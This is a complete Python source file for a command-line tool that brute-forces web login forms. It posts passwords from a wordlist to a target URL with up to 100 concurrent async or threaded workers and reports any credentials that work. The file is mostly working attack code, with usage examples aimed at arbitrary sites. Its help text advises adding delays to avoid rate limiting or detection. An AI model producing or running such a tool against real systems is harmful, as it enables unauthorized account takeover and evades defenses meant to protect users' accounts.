#!/usr/bin/env python3
"""
Advanced Login Bruteforcer
Optimized for high-performance credential testing

Usage:
  python3 login_bruteforcer.py [OPTIONS]
  python3 login_bruteforcer.py --url http://test.com/login --username admin --password-file passwords.txt --failed-string "invalid"

Example:
  python3 login_bruteforcer.py --url http://test.com/login --username admin --password-file pass.txt --failed-string "login failed" --workers 100 --mode async
"""

import asyncio
import aiohttp
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from typing import List
import argparse

# ANSI color codes
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'

class AdvancedLoginBruteforcer:
    def __init__(self, max_workers=50):
        self.max_workers = max_workers
        self.found_credentials = []
        self.tested_count = 0
        self.start_time = 0
        
    def print_banner(self):
        banner = f"""
{CYAN}
╔══════════════════════════════════════════════╗
║           ADVANCED LOGIN BRUTEFORCER         ║
║          Optimized for Performance           ║
╚══════════════════════════════════════════════╝
{RESET}
        """
        print(banner)
    
    async def test_single_login(self, session, url, username, password, login_failed_string, timeout=10):
        """Test a single login credential asynchronously"""
        data = {'username': username, 'password': password, 'Login': 'submit'}
        
        try:
            async with session.post(url, data=data, timeout=timeout) as response:
                response_text = await response.text()
                
                if login_failed_string not in response_text:
                    return True, password, None
                else:
                    return False, password, None
                    
        except Exception as e:
            return False, password, str(e)
    
    async def burst_attack(self, url, username, passwords, login_failed_string, burst_size=10, delay=0):
        """Attack with burst processing for maximum performance"""
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            tasks = []
            results = []
            
            for i, password in enumerate(passwords):
                password = password.strip()
                if not password:
                    continue
                
                # Create task for each password
                task = self.test_single_login(session, url, username, password, login_failed_string)
                tasks.append(task)
                
                # When burst size is reached, execute and clear
                if len(tasks) >= burst_size:
                    burst_results = await asyncio.gather(*tasks, return_exceptions=True)
                    results.extend(burst_results)
                    
                    # Update progress
                    self.tested_count += len(tasks)
                    self.print_progress(self.tested_count, len(passwords))
                    
                    # Clear tasks for next burst
                    tasks = []
                    
                    # Optional delay between bursts
                    if delay > 0:
                        await asyncio.sleep(delay)
            
            # Process any remaining tasks
            if tasks:
                burst_results = await asyncio.gather(*tasks, return_exceptions=True)
                results.extend(burst_results)
                self.tested_count += len(tasks)
                self.print_progress(self.tested_count, len(passwords))
            
            return results
    
    def threaded_attack(self, url, username, passwords, login_failed_string, delay=0):
        """Traditional threaded attack for comparison"""
        import requests
        from queue import Queue, Empty
        import threading
        
        print(f"{YELLOW}[*] Starting threaded attack with {self.max_workers} workers...{RESET}")
        
        def worker():
            while True:
                try:
                    password = password_queue.get_nowait()
                except Empty:
                    break
                
                try:
                    data = {'username': username, 'password': password, 'Login': 'submit'}
                    response = requests.post(url, data=data, timeout=10)
                    
                    with threading.Lock():
                        self.tested_count += 1
                        if self.tested_count % 10 == 0:
                            self.print_progress(self.tested_count, len(passwords))
                    
                    if login_failed_string not in response.text:
                        with threading.Lock():
                            self.found_credentials.append((username, password))
                            print(f'\n{GREEN}[+] SUCCESS: {username}:{password}{RESET}')
                    
                    if delay > 0:
                        time.sleep(delay)
                        
                except Exception as e:
                    pass
                
                finally:
                    password_queue.task_done()
        
        # Create queue and add passwords
        password_queue = Queue()
        for password in passwords:
            password_queue.put(password.strip())
        
        # Start workers
        threads = []
        for _ in range(min(self.max_workers, len(passwords))):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Wait for completion
        password_queue.join()
        
        # Wait for all threads to finish
        for thread in threads:
            thread.join()
    
    def print_progress(self, current, total):
        """Print progress information"""
        progress = (current / total) * 100
        elapsed = time.time() - self.start_time
        speed = current / elapsed if elapsed > 0 else 0
        
        print(f'\r{CYAN}[Progress]{RESET} {progress:.1f}% | '
              f'Tested: {current}/{total} | '
              f'Speed: {speed:.1f} req/sec | '
              f'Found: {len(self.found_credentials)} | '
              f'Elapsed: {elapsed:.1f}s', 
              end='', flush=True)
    
    def interactive_setup(self):
        """Interactive mode setup"""
        self.print_banner()
        
        print(f"{CYAN}[*] Interactive Mode Setup{RESET}")
        print(f"{CYAN}[*] Enter the following details:{RESET}")
        
        url = input(f'\n{CYAN}[+] Target Login URL:{RESET} ').strip()
        username = input(f'{CYAN}[+] Username to test:{RESET} ').strip()
        password_file = input(f'{CYAN}[+] Password file path:{RESET} ').strip()
        login_failed_string = input(f'{CYAN}[+] Login failed indicator string:{RESET} ').strip()
        
        # Advanced options
        print(f"\n{CYAN}[*] Advanced Options (press Enter for defaults){RESET}")
        max_workers = input(f'{CYAN}[+] Concurrent workers (default 50):{RESET} ')
        max_workers = int(max_workers) if max_workers else 50
        
        attack_mode = input(f'{CYAN}[+] Attack mode (async/threaded, default async):{RESET} ')
        attack_mode = attack_mode.lower() if attack_mode else 'async'
        
        burst_size = input(f'{CYAN}[+] Burst size for async (default 20):{RESET} ')
        burst_size = int(burst_size) if burst_size else 20
        
        delay = input(f'{CYAN}[+] Delay between requests (seconds, default 0):{RESET} ')
        delay = float(delay) if delay else 0
        
        return url, username, password_file, login_failed_string, max_workers, attack_mode, burst_size, delay
    
    def load_passwords(self, password_file):
        """Load passwords from file"""
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            if not passwords:
                print(f"{RED}[!] No passwords found in file{RESET}")
                sys.exit(1)
                
            return passwords
            
        except FileNotFoundError:
            print(f'{RED}[!] Password file "{password_file}" not found.{RESET}')
            sys.exit(1)
        except Exception as e:
            print(f'{RED}[!] Error reading password file: {e}{RESET}')
            sys.exit(1)
    
    async def run_async_attack(self, url, username, passwords, login_failed_string, burst_size, delay):
        """Run asynchronous attack"""
        print(f"{YELLOW}[*] Starting asynchronous burst attack...{RESET}")
        print(f"{YELLOW}[*] Burst size: {burst_size} | Workers: {self.max_workers}{RESET}")
        
        results = await self.burst_attack(url, username, passwords, login_failed_string, burst_size, delay)
        
        # Process results
        for success, password, error in results:
            if success:
                self.found_credentials.append((username, password))
                print(f'\n{GREEN}[+] SUCCESS: {username}:{password}{RESET}')
    
    def run_threaded_attack(self, url, username, passwords, login_failed_string, delay):
        """Run threaded attack"""
        self.threaded_attack(url, username, passwords, login_failed_string, delay)

def print_help():
    """Display comprehensive help information"""
    help_text = f"""
{CYAN}
╔══════════════════════════════════════════════╗
║           ADVANCED LOGIN BRUTEFORCER         ║
║                 HELP MENU                    ║
╚══════════════════════════════════════════════╝
{RESET}

{YELLOW}USAGE:{RESET}
  {GREEN}python3 login_bruteforcer.py [OPTIONS]{RESET}
  {GREEN}python3 login_bruteforcer.py  {CYAN}# Interactive mode{RESET}

{YELLOW}BASIC SYNTAX:{RESET}
  {GREEN}python3 login_bruteforcer.py --url <TARGET_URL> --username <USERNAME> --password-file <FILE> --failed-string "<FAILED_STRING>"{RESET}

{YELLOW}OPTIONS:{RESET}
  {BLUE}-h, --help{RESET}            Show this help message and exit
  {BLUE}--url URL{RESET}             Target login page URL (required)
  {BLUE}--username USERNAME{RESET}   Username to test (required)
  {BLUE}--password-file FILE{RESET}  Path to password file (required)
  {BLUE}--failed-string STRING{RESET} Text that appears on failed login (required)
  {BLUE}--workers NUMBER{RESET}      Number of concurrent workers (default: 50)
  {BLUE}--mode {GREEN}{{async,threaded}}{RESET}  Attack mode (default: async)
  {BLUE}--burst-size NUMBER{RESET}   Burst size for async mode (default: 20)
  {BLUE}--delay SECONDS{RESET}       Delay between requests (default: 0)

{YELLOW}EXAMPLES:{RESET}

{CYAN}1. Basic Attack (Interactive):{RESET}
  {GREEN}python3 login_bruteforcer.py{RESET}
  {YELLOW}Then enter details when prompted{RESET}

{CYAN}2. High-Speed Async Attack:{RESET}
  {GREEN}python3 login_bruteforcer.py --url http://test.com/login --username admin --password-file passwords.txt --failed-string "Invalid credentials" --workers 100 --mode async --burst-size 50{RESET}

{CYAN}3. Threaded Attack with Delay:{RESET}
  {GREEN}python3 login_bruteforcer.py --url https://site.org/login.php --username user --password-file wordlist.txt --failed-string "Login failed" --workers 25 --mode threaded --delay 0.1{RESET}

{CYAN}4. Quick Test:{RESET}
  {GREEN}python3 login_bruteforcer.py --url http://localhost/login --username test --password-file common_passwords.txt --failed-string "error" --workers 10{RESET}

{YELLOW}TIPS:{RESET}
  • Use {GREEN}async{RESET} mode for maximum speed (recommended)
  • Use {GREEN}threaded{RESET} mode if async has compatibility issues
  • Increase {GREEN}workers{RESET} for better performance on fast connections
  • Add {GREEN}delay{RESET} to avoid rate limiting or detection
  • The {GREEN}failed-string{RESET} should be text that appears ONLY on failed login attempts

{YELLOW}PASSWORD FILE FORMAT:{RESET}
  • One password per line
  • Supports any encoding
  • Blank lines are ignored
  • Example:
      password123
      admin
      123456
      letmein

{YELLOW}REQUIRED DEPENDENCIES:{RESET}
  {GREEN}pip install aiohttp requests{RESET}
"""
    print(help_text)

def main():
    # Command line argument parsing with comprehensive help
    parser = argparse.ArgumentParser(
        description='Advanced Login Bruteforcer - High-performance credential testing tool',
        add_help=False
    )
    
    parser.add_argument('-h', '--help', action='store_true', help='Show help message and exit')
    parser.add_argument('--url', help='Target login page URL')
    parser.add_argument('--username', help='Username to test')
    parser.add_argument('--password-file', help='Path to password file')
    parser.add_argument('--failed-string', help='Text that appears on failed login')
    parser.add_argument('--workers', type=int, default=50, help='Number of concurrent workers (default: 50)')
    parser.add_argument('--mode', choices=['async', 'threaded'], default='async', help='Attack mode (default: async)')
    parser.add_argument('--burst-size', type=int, default=20, help='Burst size for async mode (default: 20)')
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests in seconds (default: 0)')
    
    args = parser.parse_args()
    
    # Show help if requested
    if args.help:
        print_help()
        sys.exit(0)
    
    bruteforcer = AdvancedLoginBruteforcer()
    
    # Interactive mode if no arguments provided
    if not any([args.url, args.username, args.password_file, args.failed_string]):
        print(f"{YELLOW}[*] No command-line arguments provided. Starting interactive mode...{RESET}")
        url, username, password_file, login_failed_string, max_workers, attack_mode, burst_size, delay = bruteforcer.interactive_setup()
    else:
        # Command line mode
        url = args.url
        username = args.username
        password_file = args.password_file
        login_failed_string = args.failed_string
        max_workers = args.workers
        attack_mode = args.mode
        burst_size = args.burst_size
        delay = args.delay
        
        # Validate required arguments
        if not all([url, username, password_file, login_failed_string]):
            print(f"{RED}[!] Missing required arguments{RESET}")
            print(f"{YELLOW}[!] Required: --url, --username, --password-file, --failed-string{RESET}")
            print(f"{YELLOW}[!] Use {GREEN}--help{RESET} for usage information")
            sys.exit(1)
    
    # Load passwords
    passwords = bruteforcer.load_passwords(password_file)
    bruteforcer.max_workers = max_workers
    
    print(f"\n{MAGENTA}[*] Attack Summary{RESET}")
    print(f"{MAGENTA}[*] Target:{RESET} {url}")
    print(f"{MAGENTA}[*] Username:{RESET} {username}")
    print(f"{MAGENTA}[*] Passwords to test:{RESET} {len(passwords)}")
    print(f"{MAGENTA}[*] Attack mode:{RESET} {attack_mode}")
    print(f"{MAGENTA}[*] Workers:{RESET} {max_workers}")
    if attack_mode == 'async':
        print(f"{MAGENTA}[*] Burst size:{RESET} {burst_size}")
    print(f"{MAGENTA}[*] Delay:{RESET} {delay}s")
    print(f"{MAGENTA}[*] Failed string:{RESET} '{login_failed_string}'\n")
    
    # Start attack
    bruteforcer.start_time = time.time()
    
    try:
        if attack_mode == 'async':
            asyncio.run(bruteforcer.run_async_attack(url, username, passwords, login_failed_string, burst_size, delay))
        else:
            bruteforcer.run_threaded_attack(url, username, passwords, login_failed_string, delay)
    
    except KeyboardInterrupt:
        print(f'\n{YELLOW}[!] Attack interrupted by user{RESET}')
    except Exception as e:
        print(f'\n{RED}[!] Error during attack: {e}{RESET}')
    
    # Final results
    total_time = time.time() - bruteforcer.start_time
    print(f'\n\n{CYAN}[*] Attack completed{RESET}')
    print(f'{CYAN}[*] Total time:{RESET} {total_time:.2f}s')
    print(f'{CYAN}[*] Passwords tested:{RESET} {bruteforcer.tested_count}')
    print(f'{CYAN}[*] Successful logins:{RESET} {GREEN}{len(bruteforcer.found_credentials)}{RESET}')
    print(f'{CYAN}[*] Speed:{RESET} {bruteforcer.tested_count/total_time:.1f} requests/second')
    
    if bruteforcer.found_credentials:
        print(f'\n{GREEN}[*] VALID CREDENTIALS FOUND:{RESET}')
        for username, password in bruteforcer.found_credentials:
            print(f'{GREEN}    {username}:{password}{RESET}')
    else:
        print(f'\n{RED}[-] No valid credentials found{RESET}')

if __name__ == "__main__":
    # Check for required dependencies
    try:
        import aiohttp
    except ImportError:
        print(f"{RED}[!] aiohttp not installed.{RESET}")
        print(f"{YELLOW}[!] Install with: {GREEN}pip install aiohttp requests{RESET}")
        sys.exit(1)
    
    main()
